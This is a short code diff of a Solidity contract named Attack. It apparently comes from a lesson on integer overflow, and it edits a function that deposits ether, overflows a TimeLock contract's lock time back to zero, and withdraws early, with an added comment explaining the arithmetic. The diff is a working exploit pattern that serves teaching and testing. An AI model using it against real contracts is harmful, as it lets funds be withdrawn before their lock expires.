@@ -52,8 +52,13 @@ contract Attack {
 
     function attack() public payable {
         timeLock.deposit{value: msg.value}();
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        */
         timeLock.increaseLockTime(
-            uint(-1) - timeLock.lockTime(address(this)) + 1
+            uint(-timeLock.lockTime(address(this)))
         );
         timeLock.withdraw();
     }
